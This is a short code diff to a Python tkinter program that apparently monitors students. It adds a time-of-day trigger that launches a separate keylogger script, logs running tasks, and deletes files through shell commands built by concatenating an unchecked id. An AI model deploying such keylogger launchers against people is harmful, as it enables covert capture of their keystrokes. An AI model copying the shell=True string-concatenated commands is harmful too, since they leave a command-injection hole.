@@ -4,7 +4,6 @@ from tkinter import messagebox
 import datetime
 import pyautogui
 import subprocess
-import os
 
 #===================function===========================
 
@@ -26,9 +25,16 @@ def cmd():
     
 def rename():
     subprocess.run("rename Temp " + id, shell=True)
+    subprocess.run("del \""+id+"\\running.txt\"", shell=True)
 
 def keylogger():
-    subprocess.Popen('python material\\Keylogger.py', shell=True)
+
+    ####### fix mean set time to capture detect
+    fix = "162400"
+
+    t = str(datetime.datetime.now().strftime("%H")) + str(datetime.datetime.now().strftime("%M")) +  str(datetime.datetime.now().strftime("%S"))
+    if t >= fix:
+        subprocess.Popen('python material\\Keylogger.py', shell=True)
 
 def tasklist():
     subprocess.run("tasklist /fi \"STATUS eq RUNNING\" > Temp\\running.txt", shell=True)
@@ -66,8 +72,9 @@ def student():
         Window.geometry("300x150")
 
         def clock():
+   
             ####### fix mean set time to capture detect
-            fix = "184000"
+            fix = "161400"
             hour = str(datetime.datetime.now().strftime("%H"))
             minute = str(datetime.datetime.now().strftime("%M"))
             second = str(datetime.datetime.now().strftime("%S"))
